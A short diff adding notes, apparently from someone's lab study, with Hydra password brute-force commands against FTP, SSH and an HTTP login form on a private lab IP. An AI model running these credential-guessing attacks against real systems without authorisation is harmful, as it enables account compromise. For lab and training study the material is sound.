@@ -10,3 +10,16 @@ https://en.kali.tools/?p=220
 
 ![image](https://user-images.githubusercontent.com/105601437/222922462-c0cf02c3-92d4-4950-a0f1-6f4936706740.png)
 
+
+
+<br>
+FTP
+hydra -l user -P passlist.txt ftp://10.10.149.84
+
+SSH
+hydra -l <username> -P <full path to pass> 10.10.149.84 -t 4 ssh
+
+  
+ Web Form
+hydra -l <username> -P <wordlist> 10.10.149.84 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
